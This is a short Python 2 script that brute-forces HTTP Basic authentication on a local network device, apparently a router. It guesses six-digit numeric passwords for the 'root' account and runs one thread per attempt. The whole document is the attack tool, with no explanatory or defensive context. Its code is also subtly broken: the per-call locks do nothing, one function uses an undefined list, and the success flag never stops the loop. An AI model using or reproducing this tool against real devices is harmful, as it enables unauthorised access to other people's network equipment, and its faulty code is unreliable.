import threading, time, random, sys
import urllib2

curint = 100000
url = "http://192.168.1.254"
success = ""

def getword():
    lock = threading.Lock()
    lock.acquire()
    strtmp = ""
    global curint
    if curint <> 999999:
        strtmp = str(curint)
        curint = curint + 1
    lock.release()
    return strtmp

def reputword(value):
    lock = threading.Lock()
    lock.acquire()
    words.append(value + '\n')
    lock.release()

class Worker(threading.Thread):

    def run(self):
        password = getword()
        try:
            password_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
            password_mgr.add_password("Way OS", url, "root", password)
            handler = urllib2.HTTPBasicAuthHandler(password_mgr)
            opener = urllib2.build_opener(handler)
            response =opener.open(url)
            success = password
            response.close()
            print password, "success"
        except urllib2.HTTPError, e:
            print password, e.msg
        except Exception,e:
            print e.message
            pass

for I in range(900000):
    if  len(success) == 0:
        work = Worker()
        work.start()
        time.sleep(1)


